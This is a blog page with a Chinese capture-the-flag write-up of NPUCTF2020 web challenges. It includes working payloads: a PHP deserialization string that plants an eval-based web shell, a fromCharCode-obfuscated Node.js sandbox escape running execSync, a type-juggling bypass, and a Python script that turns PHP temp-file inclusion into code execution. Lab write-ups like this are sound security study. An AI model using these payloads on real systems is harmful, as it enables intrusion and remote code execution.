@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='查源码 F12，ctrl&#43;U，没啥好说的
+RealEzPHP 打开是个黑页，查看源码发现了 ./time.php?source 访问之：
+ &amp;lt;?php#error_reporting(0);class HelloPhp{public $a;public $b;public function __construct(){$this-&amp;gt;a = &amp;quot;Y-m-d h:i:s&amp;quot;;$this-&amp;gt;b = &amp;quot;date&amp;quot;;}public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){highlight_file(__FILE__);die(0);}@$ppp = unserialize($_GET[&amp;quot;data&amp;quot;]);2020-04-21 07:53:29很简单的一个反序列化，
+&amp;lt;?php#error_reporting(0);class HelloPhp{public $a = &#39;1&#39;;//更改为2，3，4，5能读取更多信息public $b = &#39;phpinfo&#39;;/*public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}*/}$pop = new HelloPhp;echo serialize($pop);直接 ?'><title>NPUCTF2020_wp</title>
+
+<link rel='canonical' href='https://anthem-whisper.github.io/p/npuctf2020_wp/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='NPUCTF2020_wp'>
+<meta property='og:description' content='查源码 F12，ctrl&#43;U，没啥好说的
+RealEzPHP 打开是个黑页，查看源码发现了 ./time.php?source 访问之：
+ &amp;lt;?php#error_reporting(0);class HelloPhp{public $a;public $b;public function __construct(){$this-&amp;gt;a = &amp;quot;Y-m-d h:i:s&amp;quot;;$this-&amp;gt;b = &amp;quot;date&amp;quot;;}public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){highlight_file(__FILE__);die(0);}@$ppp = unserialize($_GET[&amp;quot;data&amp;quot;]);2020-04-21 07:53:29很简单的一个反序列化，
+&amp;lt;?php#error_reporting(0);class HelloPhp{public $a = &#39;1&#39;;//更改为2，3，4，5能读取更多信息public $b = &#39;phpinfo&#39;;/*public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}*/}$pop = new HelloPhp;echo serialize($pop);直接 ?'>
+<meta property='og:url' content='https://anthem-whisper.github.io/p/npuctf2020_wp/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="NPUCTF2020_wp">
+<meta name="twitter:description" content="查源码 F12，ctrl&#43;U，没啥好说的
+RealEzPHP 打开是个黑页，查看源码发现了 ./time.php?source 访问之：
+ &amp;lt;?php#error_reporting(0);class HelloPhp{public $a;public $b;public function __construct(){$this-&amp;gt;a = &amp;quot;Y-m-d h:i:s&amp;quot;;$this-&amp;gt;b = &amp;quot;date&amp;quot;;}public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){highlight_file(__FILE__);die(0);}@$ppp = unserialize($_GET[&amp;quot;data&amp;quot;]);2020-04-21 07:53:29很简单的一个反序列化，
+&amp;lt;?php#error_reporting(0);class HelloPhp{public $a = &#39;1&#39;;//更改为2，3，4，5能读取更多信息public $b = &#39;phpinfo&#39;;/*public function __destruct(){$a = $this-&amp;gt;a;$b = $this-&amp;gt;b;echo $b($a);}*/}$pop = new HelloPhp;echo serialize($pop);直接 ?">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全和代码审计</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://anthem-whisper.github.io/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/npuctf2020_wp/">NPUCTF2020_wp</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <h3 id="查源码">查源码</h3>
+<p>F12，ctrl+U，没啥好说的</p>
+<h3 id="realezphphttpsbuuojcnchallengesnpuctf2020readlezphp"><a class="link" href="https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP"  target="_blank" rel="noopener"
+    >RealEzPHP</a></h3>
+<p>打开是个黑页，查看源码发现了 <code>./time.php?source</code> 访问之：</p>
+<pre><code> &lt;?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;
+        $this-&gt;b = &quot;date&quot;;
+    }
+    public function __destruct(){
+        $a = $this-&gt;a;
+        $b = $this-&gt;b;
+        echo $b($a);
+    }
+}
+$c = new HelloPhp;
+
+if(isset($_GET['source']))
+{
+    highlight_file(__FILE__);
+    die(0);
+}
+
+@$ppp = unserialize($_GET[&quot;data&quot;]);
+
+
+2020-04-21 07:53:29
+</code></pre><p>很简单的一个反序列化，</p>
+<pre><code>&lt;?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a = '1';//更改为2，3，4，5能读取更多信息
+    public $b = 'phpinfo';
+/*
+    public function __destruct(){
+        $a = $this-&gt;a;
+        $b = $this-&gt;b;
+        echo $b($a);
+    }
+*/
+}
+
+$pop = new HelloPhp;
+echo serialize($pop);
+</code></pre><p>直接 <code>?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;}</code> 就能看到phpinfo页面；</p>
+<p>好，写后门：</p>
+<pre><code>&lt;?php
+#error_reporting(0);
+class HelloPhp
+{
+    public $a = 'eval($_POST[\'wh1sper\']);';
+    public $b = 'assert';
+/*
+    public function __destruct(){
+        $a = $this-&gt;a;
+        $b = $this-&gt;b;
+        echo $b($a);
+    }
+*/
+}
+
+$pop = new HelloPhp;
+echo serialize($pop);
+</code></pre><p>O:8:&ldquo;HelloPhp&rdquo;:2:{s:1:&ldquo;a&rdquo;;s:24:&ldquo;eval($_POST[&lsquo;wh1sper&rsquo;]);&quot;;s:1:&ldquo;b&rdquo;;s:6:&ldquo;assert&rdquo;;}</p>
+<p>蚁剑访问 <code>?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:24:&quot;eval($_POST['wh1sper']);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}</code> 密码wh1sper就能拿到shell，不过在phpinfo里面可以看到禁用了很多函数，这里可以使用蚁剑的插件绕过：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170223.png" alt="img"  /></p>
+<p>直接美滋滋；</p>
+<p>不过根目录是假flag，flag就在phpinfo页面。。。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170231.png" alt="img"  />flag{6b8ca41f-d409-4d39-b62f-5243d2f0d64b}</p>
+<p>我还去探测内网，真的搞心态。。。</p>
+<h3 id="webhttpsbuuojcnchallengesnpuctf2020web"><a class="link" href="https://buuoj.cn/challenges#[NPUCTF2020]web%f0%9f%90%95"  target="_blank" rel="noopener"
+    >web🐕</a></h3>
+<p>考察密码学，详见本站：<a class="link" href="http://wh1sper.com/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/"  target="_blank" rel="noopener"
+    >Padding Oracle Attack&amp;CBC字节翻转攻击</a></p>
+<h3 id="验证httpsbuuojcnchallengesnpuctf2020验证"><a class="link" href="https://buuoj.cn/challenges#[NPUCTF2020]%e9%aa%8c%e8%af%81%f0%9f%90%8e"  target="_blank" rel="noopener"
+    >验证🐎</a></h3>
+<p>参考：https://guokeya.github.io/post/XxOKeal9U/</p>
+<p>考点：JS弱类型转换，JS原型链</p>
+<p>源码：</p>
+<pre><code>const express = require('express');
+const bodyParser = require('body-parser');
+const cookieSession = require('cookie-session');
+
+const fs = require('fs');
+const crypto = require('crypto');
+
+const keys = require('./key.js').keys;
+
+function md5(s) {
+  return crypto.createHash('md5')
+    .update(s)
+    .digest('hex');
+}
+
+function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
+    return null;
+  }
+  return eval(str);
+} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
+
+const template = fs.readFileSync('./index.html').toString();
+function render(results) {
+  return template.replace('{{results}}', results.join('&lt;br/&gt;'));
+}
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+app.use(cookieSession({
+  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给爪⑧
+  keys
+}));
+
+Object.freeze(Object);
+Object.freeze(Math);
+
+app.post('/', function (req, res) {
+  let result = '';
+  const results = req.session.results || [];
+  const { e, first, second } = req.body;
+  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
+    if (req.body.e) {
+      try {
+        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
+      } catch (e) {
+        console.log(e);
+        result = 'Wrong Wrong Wrong!!!';
+      }
+      results.unshift(`${req.body.e}=${result}`);
+    }
+  } else {
+    results.unshift('Not verified!');
+  }
+  if (results.length &gt; 13) {
+    results.pop();
+  }
+  req.session.results = results;
+  res.send(render(req.session.results));
+});
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get('/source', function (req, res) {
+  res.set('Content-Type', 'text/javascript;charset=utf-8');
+  res.send(fs.readFileSync('./index.js'));
+});
+
+app.get('/', function (req, res) {
+  res.set('Content-Type', 'text/html;charset=utf-8');
+  req.session.admin = req.session.admin || 0;
+  res.send(render(req.session.results = req.session.results || []))
+});
+
+app.listen(80, '0.0.0.0', () =&gt; {
+  console.log('Start listening')
+});
+</code></pre><p>第一层45行，<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code>要求first和second长度相同，值不同，然后经过加盐之后值完全相同，一般这种看到就知道是弱类型，在<a class="link" href="http://wh1sper.com/susec_ctf_2020_web0_wp/"  target="_blank" rel="noopener"
+    >susecctf</a>上面遇见过，盐是字符串，当拼接的时候，first和second都会被转化为字符串，那么我们可以传入</p>
+<pre><code>first='1' second=[1]
+</code></pre><p><img src="http://wh1sper.com/wp-content/uploads/2020/04/JS%E5%8A%A0%E7%9B%90%E5%BC%B1%E7%B1%BB%E5%9E%8B.jpg" alt="img"  /></p>
+<p>但是urlencode没办法传递数组，第31行恰巧提示了可以接受json形式的数据，那么我们就可以传入json：</p>
+<pre><code>Content-Type: application/json
+{&quot;e&quot;:&quot;1+1&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]}
+</code></pre><p>我们可以看到1+1被执行了；</p>
+<p>第二层，17行， <code>if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, ''))</code> 这句话意思大概是，e的值只能 是 <code>Math.xxxxx</code> 。符号只能出现 <code>()+\-*&amp;|%^&lt;&gt;=,?:</code> 。</p>
+<p>由于=&gt;的存在，我们得以使用JS的箭头函数，大概是这个意思：</p>
+<pre><code>x =&gt; x*x
+等价于
+function (x){
+  return x*x;
+}
+</code></pre><p>我们对照着playload一步步看：</p>
+<pre><code>(Math=&gt;
+(Math=Math.constructor,
+Math.x=Math.constructor(
+Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,
+99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,
+46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,
+95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,
+121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()
+)
+)(Math+1)
+</code></pre><p>最外层的是</p>
+<pre><code>(Math=&gt;(xxxxx)())(Math+1)
+</code></pre><p>最外面的小括号是JS立即执行的函数，否则你就只是单单定义了<code>function (Math){}</code>这个函数。</p>
+<p>开头的<code>Math</code>是函数接受的参数也就是形参，<code>xxxxx</code>是函数体，<code>(Math+1)</code>是实际传入的参数</p>
+<p>接下来我们看他的函数体<code>xxxxx</code>干了些什么；</p>
+<p>举个例子：</p>
+<pre><code>Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))
+</code></pre><p>可以看到，这里定义了Math，把传入的Math的<a class="link" href="https://blog.csdn.net/zengyonglan/article/details/53465505"  target="_blank" rel="noopener"
+    >constructor属性</a>赋值</p>
+<p>具体是什么意思呢？这里是利用了JS的原型链：</p>
+<ul>
+<li>一开始<code>Math</code>并没有定义，如果我们直接传入<code>Match</code>，那么会是<code>object</code>，而payload中传入的是<code>Math+1</code>，此时类型就变成了<code>object1</code>。object对象和字符串进行拼接。那么会转换为<code>string</code>类型</li>
+<li>为了清楚，我们重写下代码：</li>
+</ul>
+<pre><code>test=Math.constructor //返回string类型的原型，string
+test2=test.constructor //返回string原型的原型，function
+</code></pre><ul>
+<li>也就是通过一个 <code>object1</code> 从原型链上获取了<code>string</code>和<code>function</code>两种类型</li>
+</ul>
+<p>回到题目，</p>
+<pre><code>#fromCharCode函数必须是在string类型上用。
+Math=Math.constructor
+  #定义了string类型
+Math=Math.construtor
+  #定义了function类型
+Math.constructor,Math=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()
+等同于
+function(string.fromCharCode(xxxxxxxxx)()
+</code></pre><p>exp中fromCharCode里面解码是：</p>
+<pre><code>return process.mainModule.require('child_process').execSync('cat /flag').toString()
+</code></pre><p>相当于我们执行了：</p>
+<pre><code>function(
+return process.mainModule.require('child_process').execSync('cat /flag').toString()
+)()
+</code></pre><p>flag{7683e76d-e61e-4b5a-bca0-3ad38bfa27a0}</p>
+<h3 id="ezincludehttpsbuuojcnchallengesnpuctf2020ezinclude"><a class="link" href="https://buuoj.cn/challenges#[NPUCTF2020]ezinclude"  target="_blank" rel="noopener"
+    >ezinclude</a></h3>
+<p>考点：MD5哈希长度拓展攻击（疑似）、PHP7利用php Segfault包含保存的临时文件</p>
+<p>打开题目，源代码里面有提示：<code>&lt;!--md5($secret.$name)===$pass --&gt;</code> 疑似<a class="link" href="https://xz.aliyun.com/t/2563"  target="_blank" rel="noopener"
+    >MD5哈希长度拓展攻击</a>，不过在响应包里面给出啦pass的值，可能是出题出翻车了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170244.png" alt="img"  /></p>
+<p>得到了 <code>flflflflag.php</code> ，访问重定向到了其他页面，抓包抓回来，页面提示 <code>include($_GET[&quot;file&quot;])</code> ，扫目录可以得到 <code>dir.php</code> ,包含他可以看到这个页面列出了 <code>/tmp</code> 下的所有文件</p>
+<p>这里考察的是PHP临时文件包含，其基本是两种情况：</p>
+<ol>
+<li>利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除</li>
+<li>PHP版本&lt;7.2，利用php崩溃留下临时文件</li>
+</ol>
+<p>贴一篇：<a class="link" href="https://bbs.zkaq.cn/t/3639.html"  target="_blank" rel="noopener"
+    >&raquo;LFIroRCE总结</a></p>
+<p><a class="link" href="https://zhuanlan.zhihu.com/p/62958418"  target="_blank" rel="noopener"
+    >&raquo;文件包含&amp;奇技淫巧</a></p>
+<p>这里就不累述了，直接上脚本：</p>
+<pre><code>import requests
+from io import BytesIO
+
+payload = &quot;&lt;?php phpinfo()?&gt;&quot;
+file_data = {
+    'file': BytesIO(payload.encode())
+}
+url = &quot;http://35869f0e-43e6-47db-a026-b77fdfed3fea.node3.buuoj.cn/flflflflag.php?&quot;\
+      +&quot;file=php://filter/string.strip_tags/resource=/etc/passwd&quot;
+r = requests.post(url=url, files=file_data, allow_redirects=False)
+</code></pre><p>然后访问 <code>dir.php</code> 可以得到临时文件的名称，包含之即可RCE</p>
+<p>flag就在phpinfo页面</p>
+<p>flag{2ac28208-c35f-426b-bca5-4f50a77e1203}</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2019 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
